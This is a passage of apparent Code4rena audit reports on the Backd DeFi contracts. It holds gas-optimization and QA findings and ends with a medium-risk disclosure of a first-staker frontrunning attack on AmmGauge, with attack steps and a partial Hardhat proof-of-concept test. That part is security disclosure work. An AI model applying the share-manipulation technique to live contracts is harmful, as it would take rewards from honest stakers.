protocol/contracts/BkdLocker.sol  /// @audit stashedWithdraws[i] 142:                  totalAvailableToWithdraw += stashedWithdraws[i].amount; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L142  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  /// @audit amounts[i] 96:               address recipient_ = amounts[i].recipient; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L96  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  /// @audit keeperRecords[beneficiary] 84:               keeperRecords[beneficiary].firstEpochSet = true;  /// @audit keeperRecords[beneficiary] 85:               keeperRecords[beneficiary].nextEpochToClaim = epoch;  /// @audit keeperRecords[beneficiary] 87:           keeperRecords[beneficiary].feesInPeriod[epoch] += amount;  /// @audit keeperRecords[beneficiary] 139:          keeperRecords[beneficiary].nextEpochToClaim = endEpoch; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L84  ```solidity File: protocol/contracts/access/RoleManager.sol  /// @audit _roles[role] 148:          return _roles[role].members[account]; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L148  ### 6. The result of external function calls should be cached rather than re-calling the function The instances below point to the second+ call of the function within a single function  *There are 2 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol   #1  /// @audit _controller.addressProvider() 62:           Authorization(_controller.addressProvider().getRoleManager()) ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L62  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #2  /// @audit i.uncheckedInc() 121:          for (uint256 i; i < length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L121  ### 7. `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables  *There are 14 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  343:              strategiesTotalStaked += staked;  345:              _poolTotalStaked += staked;  392:              strategiesTotalStaked -= unstaked;  394:              _poolTotalStaked -= unstaked; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L343  ```solidity File: protocol/contracts/BkdLocker.sol  152:          totalLocked -= totalAvailableToWithdraw;  230:          totalLocked += amount; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L152  ```solidity File: protocol/contracts/tokenomics/Minter.sol  154:          issuedNonInflationSupply += amount;  188:          totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));  218:          totalAvailableToNow += ((block.timestamp - lastEvent) * currentTotalInflation); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L154  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  67:           _vestedBefore += vested; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L67  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  113:          totalStaked += staked;  135:          totalStaked -= unstaked;  148:              ammStakedIntegral += (currentRate * timeElapsed).scaledDiv(totalStaked); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L113  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  115               poolStakedIntegral += (currentRate * (block.timestamp - poolLastUpdate)).scaledDiv( 116                   poolTotalStaked 117:              ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L115-L117  ### 8. `internal` functions only called once can be inlined to save gas Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.  *There are 6 instances of this issue:* ```solidity File: protocol/contracts/AddressProvider.sol  433:      function _addKnownAddressKey(bytes32 key, AddressProviderMeta.Meta memory meta) internal { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L433  ```solidity File: protocol/contracts/RewardHandler.sol  62:       function _approve(address token, address spender) internal { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L62  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  146:      function _mintRewards(address beneficiary, uint256 amount) internal returns (bool) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L146  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  96        function _depositInPool(address underlying_, ILiquidityPool pool_) 97            internal 98:           returns (uint256 received)  125:      function _swapperRouter() internal view returns (ISwapperRouter) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L96-L98  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  106:      function _mintRewards(address beneficiary, uint256 amount) internal { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L106  ### 9. Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` `require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  63:           totalTime = endtime_ - starttime_; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L63  ### 10. `<array>.length` should not be looked up in every loop of a `for`-loop The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**)  Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset  *There are 8 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  259:          for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ``"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/107", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "1.  Title: Caching `.length` for loop can save gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L82 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L39  Recommended Mitigation Steps: Change to: ```  uint256 Length = roles.length;  for (uint256 i; i < Length; i = i.uncheckedInc()) { ```  ========================================================================  2. Title: Using != is more gas efficient  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L91 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L254  Recommended Mitigation Steps: Change to `!=` ```   require(amount != 0, Error.INVALID_AMOUNT); ```  ========================================================================  3. Title: Using delete statement to empty `curRewardTokenData.userShares` can save gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L215 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/Preparable.sol#L87-L88  Recommended Mitigation Steps: ```  delete curRewardTokenData.userShares[msg.sender]; ```  ========================================================================  4. Title: Gas improvement on returning `totalEthRequired` value  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L121-L130  Recommended Mitigation Steps: by set `totalEthRequired` in returns and delete L#123 can save gas ``` function getTotalEthRequiredForGas(address payer) external view override returns (uint256 totalEthRequired) { //@audit-info: set here         // solhint-disable-previous-line ordering  //@audit-info: remove this line         address[] memory actions = addressProvider.allActions();         uint256 numActions = actions.length;         for (uint256 i = 0; i < numActions; i++) {             totalEthRequired += IAction(actions[i]).getEthRequiredForGas(payer);         }  return totalEthRequired;     } ```  ========================================================================  5. Title: Using unchecked to calculate  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L124  Recommended Mitigation Steps: `balances[msg.sender]` value was checked that it >= than `amount` so using unchecked can save gas: ``` unchecked{  balances[msg.sender] -= amount; } ```  ========================================================================  6. Title: Unnecessary MSTORE `timeElapsed`  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L144-L149  Recommended Mitigation Steps: By passing `block.timestamp - uint256(ammLastUpdated)` directly to L#148 without storing it to `timeElapsed` can save gas without damaging readability of the code  ```  ammStakedIntegral += (currentRate * (block.timestamp - uint256(ammLastUpdated)).scaledDiv(totalStaked); ```  ========================================================================  7. Title: Unnecessary MSTORE  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L138-L144  Recommended Mitigation Steps: instead of caching `length` to `i`. use it directly can save gas delete L#138 and replace `i` with `length  ========================================================================  8. Title: Use `allowance_` directly to substract  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L387  Recommended Mitigation Steps: ```  _allowances[src][msg.sender] = allowance_ - unstaked; ```  ========================================================================  9. Title: Unnecessary `bool` var set  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L412  Recommended Mitigation Steps: the default value of `bool` is `false`  ========================================================================  10. Title: Using `>` instead `>=` can save gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L57 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/Preparable.sol#L110  Recommended Mitigation Steps: 1 second difference can be ignored to validate. using `>` operator can save gas ```  require(starttime_ > block.timestamp, \"start must be future\"); ```  ========================================================================  11. Title: Use custom errors rather than revert()/require() strings to save deployment gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L53-L54  reference: https://blog.soliditylang.org/2021/04/21/custom-errors/  ========================================================================  13. Title: Using `+=` to increase value  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L145  Recommended Mitigation Steps: Change to: ```  totalClaimed[msg.sender] += claimable; ```  ========================================================================  14 Title: Unnecessary MSTORE  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L155-L156  Recommended Mitigation Steps: instead of caching to `elapsed`. calculate directly can save gas delete L#155  ```  return Math.min((locked * (_time - startTime)) / totalTime, locked); ```  ========================================================================"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/106", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## Don't use deprecated library functions  Information : [L005 - Do not use Deprecated Library Functions](https://github.com/byterocket/c4-common-issues/blob/main/2-Low-Risk.md#l005---do-not-use-deprecated-library-functions) [SafeERC20.sol - safeApprove](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/65b45726b34dafe8fc3ef78c3d4b7b3f404f61ad/contracts/token/ERC20/utils/SafeERC20.sol#L39)  ### Instances include : ``` contracts/RewardHandler.sol:52:        IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount); contracts/RewardHandler.sol:64:        IERC20(token).safeApprove(spender, type(uint256).max); contracts/tokenomics/FeeBurner.sol:118:        IERC20(token_).safeApprove(spender_, type(uint256).max); contracts/zaps/PoolMigrationZap.sol:27:            IERC20(underlying_).safeApprove(address(newPool_), type(uint256).max); ```  ### Recommendation Usage of deprecated library functions, for instance `safeApprove` from OpenZeppelin's `SafeERC20` library is discouraged, it is recommended to use `safeIncreaseAllowance` and `safeDecreaseAllowance` instead.  --- ## Too many digits Information : [Too many digits](https://github.com/crytic/slither/wiki/Detector-Documentation#too-many-digits)   ### Instances include : ``` contracts/utils/CvxMintAmount.sol:10:    uint256 private constant _CLIFF_SIZE = 100000 * 1e18; //new cliff every 100,000 tokens contracts/utils/CvxMintAmount.sol:12:    uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply ```  ### Recommendation Use the scientific notation  --- ## Block timestamp Information : [Block timestamp](https://github.com/crytic/slither/wiki/Detector-Documentation#block-timestamp)  ### Instances include : ``` contracts/utils/Preparable.sol:110:        require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED); contracts/tokenomics/Minter.sol:190:        if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) { contracts/BkdLocker.sol:141:            if (stashedWithdraws[i].releaseTime <= block.timestamp) { ``` ### Recommendation Avoid relying on `block.timestamp`.  --- ## Typos  ### Instances include: `invlude`, `successfull` ``` contracts/BkdLocker.sol:     * @dev This does not invlude the gov. tokens queued for withdrawal. contracts/tokenomics/FeeBurner.sol:    event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/104", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Gas Optimizations Report  ## For-Loops: Cache array length outside of loops Reading an array length at each iteration of the loop takes 6 gas (3 for `mload` and 3 to place `memory_offset`) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.   For example: ```js for (uint256 i; i < arr.length; ++i) {} ``` can be changed to: ```js uint256 len = arr.length; for (uint256 i; i < len; ++i) {} ```  Consider making the following change to these lines:   ```js protocol/contracts/RewardHandler.sol:   42:        for (uint256 i; i < pools.length; i = i.uncheckedInc()) {  protocol/contracts/StakerVault.sol:  259:        for (uint256 i; i < actions.length; i = i.uncheckedInc()) {  protocol/contracts/tokenomics/VestedEscrow.sol:   94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) {  protocol/contracts/tokenomics/InflationManager.sol:  116:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) {  protocol/contracts/tokenomics/FeeBurner.sol:   56:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) {  protocol/contracts/zaps/PoolMigrationZap.sol:   22:        for (uint256 i; i < newPools_.length; ++i) {   39:        for (uint256 i; i < oldPoolAddresses_.length; ) {  protocol/contracts/access/RoleManager.sol:   82:        for (uint256 i; i < roles.length; i = i.uncheckedInc()) { ```  ## For-Loops: Index increments can be left unchecked From Solidity v0.8 onwards, all arithmetic operations come with implicit overflow and underflow checks.   In for-loops, as it is impossible for the index to overflow, it can be left unchecked to save gas every iteration.   For example, the code below: ```js for (uint256 i; i < numIterations; ++i) {       // ...   }   ``` can be changed to: ```js for (uint256 i; i < numIterations;) {       // ...       unchecked { ++i; }   }   ```  Consider making the following change to these lines:   ```js protocol/contracts/zaps/PoolMigrationZap.sol:   22:        for (uint256 i; i < newPools_.length; ++i) { ```  ## Arithmetics: `++i` costs less gas compared to `i++` or `i += 1` `++i` costs less gas compared to `i++` or `i += 1` for unsigned integers, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means: ```js uint i = 1;   i++; // == 1 but i == 2   ``` But `++i` returns the actual incremented value: ```js uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`, thus it costs more gas.  The same logic applies for `--i` and `i--`.  Consider using `++i` instead of `i++` or `i += 1` in the following instances:   ```js protocol/contracts/tokenomics/KeeperGauge.sol:   59:        epoch++;   98:        epoch++; ```  ## Arithmetics: Use `!= 0` instead of `> 0` for unsigned integers `uint` will never go below 0. Thus, `> 0` is gas inefficient in comparisons as checking if `!= 0` is sufficient and costs less gas.  Consider changing `> 0` to `!= 0` in these lines:   ```js protocol/contracts/BkdLocker.sol:   91:        require(amount > 0, Error.INVALID_AMOUNT);   92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);  137:        require(length > 0, \"No entries\");  139:        while (i > 0) {  254:        if (userBalance > 0) {  301:        if (userBalance > 0) {  protocol/contracts/RewardHandler.sol:   63:        if (IERC20(token).allowance(address(this), spender) > 0) return;  protocol/contracts/tokenomics/AmmGauge.sol:   88:        if (!killed && totalStaked > 0) {  104:        require(amount > 0, Error.INVALID_AMOUNT);  125:        require(amount > 0, Error.INVALID_AMOUNT);  147:        if (totalStaked > 0) {  protocol/contracts/tokenomics/AmmConvexGauge.sol:  107:        if (!killed && totalStaked > 0) {  129:        if (!killed && totalStaked > 0) {  158:        require(amount > 0, Error.INVALID_AMOUNT);  171:        require(amount > 0, Error.INVALID_AMOUNT);  197:        if (totalStaked > 0) {  protocol/contracts/tokenomics/VestedEscrow.sol:   84:        require(unallocatedSupply > 0, \"No reward tokens in contract\");  protocol/contracts/tokenomics/InflationManager.sol:  575:        totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;  589:        totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;  602:        totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0;  protocol/contracts/tokenomics/LpGauge.sol:   68:        if (poolTotalStaked > 0) {  114:        if (poolTotalStaked > 0) {  protocol/contracts/tokenomics/FeeBurner.sol:  117:        if (IERC20(token_).allowance(address(this), spender_) > 0) return;  protocol/contracts/tokenomics/KeeperGauge.sol:  140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ```  ## Errors: Use custom errors instead of revert strings Since Solidity v0.8.4, custom errors should be used instead of revert strings due to: * Cheaper deployment cost * Lower runtime cost upon revert  Taken from [Custom Errors in Solidity](https://blog.soliditylang.org/2021/04/21/custom-errors/): > Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors can be defined using of the `error` statement, both inside or outside of contracts.  Instances where custom errors can be used instead:   ```js protocol/contracts/BkdLocker.sol:  137:        require(length > 0, \"No entries\");  protocol/contracts/tokenomics/Minter.sol:  100:        require(address(token) == address(0), \"Token already set!\");  105:        require(lastEvent == 0, \"Inflation has already started.\");  220:        require(newTotalMintedToNow <= totalAvailableToNow, \"Mintable amount exceeded\");  protocol/contracts/tokenomics/VestedEscrow.sol:   57:        require(starttime_ >= block.timestamp, \"start must be future\");   58:        require(endtime_ > starttime_, \"end must be greater\");   82:        require(!initializedSupply, \"Supply already initialized once\");   84:        require(unallocatedSupply > 0, \"No reward tokens in contract\");   91:        require(initializedSupply, \"Supply must be initialized\");  protocol/contracts/tokenomics/InflationManager.sol:   95:        require(!weightBasedKeeperDistributionDeactivated, \"Weight-based dist. deactivated.\");  265:        require(length == weights.length, \"Invalid length of arguments\");  315:        require(_ammGauges.contains(token), \"amm gauge not found\");  365:        require(length == weights.length, \"Invalid length of arguments\");  367:        require(_ammGauges.contains(tokens[i]), \"amm gauge not found\");  protocol/contracts/tokenomics/VestedEscrowRevocable.sol:   53:        require(revokedTime[_recipient] == 0, \"Recipient already revoked\");   54:        require(_recipient != treasury, \"Treasury cannot be revoked!\");  protocol/contracts/tokenomics/FeeBurner.sol:   49:        require(tokens_.length != 0, \"No tokens to burn\");  protocol/contracts/zaps/PoolMigrationZap.sol:   56:        require(lpTokenAmount_ != 0, \"No LP Tokens\");   57:        require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, \"withdrawal fee not 0\"); ```  ## Unnecessary initialization of variables with default values Uninitialized variables are assigned with a default value depending on its type: * `uint`: `0` * `bool`: `false` * `address`: `address(0)`  Thus, explicitly initializing a variable with its default value costs unnecesary gas. For example, the following code: ```js bool b = false; address c = address(0); uint256 a = 0; ``` can be changed to: ```js uint256 a; bool b; address c; ```  Consider declaring the following lines without explicitly setting a value:   ```js protocol/contracts/tokenomics/InflationManager.sol:  412:        bool keeperGaugeExists = false; ```  ## Unnecessary definition of variables Some variables are defined even though they are only used once in their respective functions. Not defining these variables can help to reduce gas cost and contract size.  Instances include:   ```js protocol/contracts/BkdLocker.sol:  150:        uint256 newTotal = balances[msg.sender] - totalAvailableToWithdraw;  protocol/contracts/RewardHandler.sol:   40:        uint256 ethBalance = address(this).balance;  protocol/contracts/tokenomics/AmmConvexGauge.sol:  153:        uint256[3] memory allRewards = [bkdRewards, crvRewards, cvxRewards];  protocol/contracts/tokenomics/VestedEscrow.sol:  155:        uint256 elapsed = _time - startTime;  protocol/contracts/tokenomics/KeeperGauge.sol:  112:        uint256 timeElapsed = block.timestamp - uint256(lastUpdated); ```   ## Storage variables should be declared `immutable` when possible If a storage variable is assigned only in the constructor, it should be declared as `immutable`. This would help to reduce gas costs as calls to `immutable` variables are much cheaper than regular state variables, as seen from the [Solidity Docs](https://docs.soliditylang.org/en/v0.8.13/contracts.html#constant-and-immutable-state-variables): > Compared to regular state variables, the gas costs of constant and immutable variables are much lower. Immutable variables are evaluated once at construction time and their value is copied to all the places in the code where they are accessed.  Consider declaring these variables as `immutable`:   ```js protocol/contracts/StakerVault.sol:   48:        address public token;  protocol/contracts/tokenomics/VestedEscrow.sol:   39:        uint256 public totalTime; ```  ## Variables declared as `constant` are expressions, not constants Due to how `constant` variables are implemented (replacements at compile-time), an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.  If the variable was `immutable` instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.  See: [ethereum/solidity#9232](https://github.com/ethereum/solidity/issues/9232): > Consequences: each usage of a \u201cconstant\u201d costs ~100 gas more on each access (it is still a little better than storing the result in storage, but not much). since these are not real constants, they can\u2019t be referenced from a real constant environment (e.g. from assembly, or from another library)  ```js protocol/contracts/tokenomics/FeeBurner.sol:   25:        address private constant _WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);  protocol/contracts/utils/CvxMintAmount.sol:   10:        uint256 private constant _CLIFF_SIZE = 100000 * 1e18;   12:        uint256 private constant _MAX_SUPPLY = 100000000 * 1e18;    13:        IERC20 private constant _CVX_TOKEN =   14:                IERC20(address(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B)); ```  Change these expressions from `constant` to `immutable` and implement the calculation in the constructor. Alternatively, hardcode these values in the constants and add a comment to say how the value was calculated. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/102", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## Don't explicitly initialize variables with the default value  Uninitialized variables are assigned with the default value of their type, initializing a variable with its default value costs unnecessary gas.  ### Instances include : ``` contracts/tokenomics/InflationManager.sol:412:        bool keeperGaugeExists = false; ```  ### Recommendation It is recommended to initialize variables without assigning them the default value, for example : ``` contracts/tokenomics/InflationManager.sol:412:        bool keeperGaugeExists; ``` ---  ## Cache array length outside of for loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.  ### Instances include : ``` contracts/RewardHandler.sol:42:        for (uint256 i; i < pools.length; i = i.uncheckedInc()) { contracts/access/RoleManager.sol:82:        for (uint256 i; i < roles.length; i = i.uncheckedInc()) { contracts/StakerVault.sol:259:        for (uint256 i; i < actions.length; i = i.uncheckedInc()) { contracts/tokenomics/VestedEscrow.sol:94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { contracts/tokenomics/InflationManager.sol:116:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { contracts/tokenomics/FeeBurner.sol:56:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { contracts/zaps/PoolMigrationZap.sol:22:        for (uint256 i; i < newPools_.length; ++i) { contracts/zaps/PoolMigrationZap.sol:39:        for (uint256 i; i < oldPoolAddresses_.length; ) { ```  ### Recommendation It is recommended to cache the array length on a variable before running the loop, then it doesn't need to read the length on every iteration, which cost gas, for example : ``` uint256 len = pools.length; contracts/RewardHandler.sol:42:        for (uint256 i; i < len; i = i.uncheckedInc()) { ``` ---  ## Use != 0 instead of > 0 when comparing unsigned integers  != 0 will do the same as > 0 for unsigned integers, but != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled.  ### Instances include : ``` contracts/BkdLocker.sol:91:        require(amount > 0, Error.INVALID_AMOUNT); contracts/BkdLocker.sol:92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); contracts/BkdLocker.sol:137:        require(length > 0, \"No entries\"); contracts/tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, \"No reward tokens in contract\"); contracts/tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); ```  ### Recommendation It is recommended to replace `> 0` with `!= 0`, as they do the same thing for unsigned integers, and '!= 0' costs less gas compared to `> 0` in require statements with the optimizer enabled, also enable the optimizer.   For example : ``` contracts/BkdLocker.sol:91:        require(amount != 0, Error.INVALID_AMOUNT); ``` ---  ## If possible, use prefix increment instead of postfix increment  Prefix increment `++i` returns the updated value after it's incremented and postfix increment `i++` returns the original value then increments it. Prefix increment costs less gas compared to postfix increment.  ### Instances includes : ``` contracts/tokenomics/KeeperGauge.sol:59:        epoch++; contracts/tokenomics/KeeperGauge.sol:98:        epoch++; ```  ### Recommendation It is recommended to use prefix increment instead of postfix one when the return value is not needed, as both of them will give the same result and prefix increment costs less gas.   For example : ``` contracts/tokenomics/KeeperGauge.sol:59:        ++epoch; ``` ---"}, {"title": "THE FIRST AMM STAKER WILL HAVE CONTROL OVER HOW THE SHARES ARE CALCULATED", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/100", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L147 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L154   # Vulnerability details  ## Impact The first staker can take control of how the subsequent shares are going to be distributed by simply staking 1wei amount of the token and frontrunning future stakers. The reasons of this are related on how the variables are updated and with the amounts that the Gauge allows users to stake (anything but zero). The origin of this vulnerability relies on the evaluation of the `totalStaked` variable on its inception.  ## Proof of Concept To illustrate this attack an environment of testing was made in order to track the token flows and how the variables are being updated and read.  The initial or border conditions taken into account are the same as the used by the team to perform the tests and just a few assumptions and simplifications were taken.  1) The inflation rate is fixed for simplicity (`0.001`). This is valid within a short period of time because it is not a function of how the tokens are distributed or their flows. By tracking how the inflation rate is calculated an updated, we see that it is managed by the `currentInflationAmountAmm` within the [`Minter.sol` contract](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L184), which value is modified by `_executeInflationRateUpdate()` three lines below the last code permalink. Its value depends on non-token balance related parameters (such as inflation decays and annual rates). 2) For the testing environment performed by the team, a DummyERC20 was used as testing token. The same is done on the exploit environment. 3) The controller is not used because it is used to retrieve the inflation rate and it is now fixed because of 1).  Each user state is updated whenever he calls either `stake`, `unstake` or `claimRewards`.  Steps: - Alice is the first staker and deposits 1wei worth of DummyERC20. - Bob takes one day to find out this new protocol and decides to stake 10 ETH amount of tokens (`10 * 10**decimals()`). - Alice, who was scanning the mempool, frontruns Bob with the same amount he was willing to stake. Her txn is mined first. - Then Bobs' transaction is mined for the 10 ETH worth. - Sometime after this, the pool is checkpointed. - A few days pass, and Bob wants to stake even more tokens. The same amount as before. - Alice frontruns him again updating her shares. - Bobs' transaction is mined and his shares are also updated. - The pool is checkpointed again. And Alice managed to increase considerably her amount of shares.  Both cases were evaluated (with and without staking 1 wei first). The attack scenario outputs a 100% more shares to Alice than Bob in comparison with the ethical/non-attack situation.  The code used to perform this test is the following:      it(\"First Depositer Exploit\", async function () {             let userShares = []             let userIntegral = []             let userBalance = []              let globalIntegral, totalStaked;             let aliceBob = [alice, bob];              // Starting Checkpoint             await this.ammgauge.poolCheckpoint();             await ethers.provider.send(\"evm_increaseTime\", [1 * 24 * 60 * 60]); // 10 days                          const updateStates = async () => {                  userShares = []                 userIntegral = []                 userBalance = []                 for (const user of aliceBob) {                     let balances = ethers.utils.formatEther(await this.ammgauge.balances(user.address));                     let currentShare = ethers.utils.formatEther(await this.ammgauge.perUserShare(user.address));                     let currentStakedIntegral = ethers.utils.formatEther(await this.ammgauge.perUserStakedIntegral(user.address));                     userShares.push(currentShare);                     userIntegral.push(currentStakedIntegral);                     userBalance.push(balances);                 }                 globalIntegral = await this.ammgauge.ammStakedIntegral()                 totalStaked = await 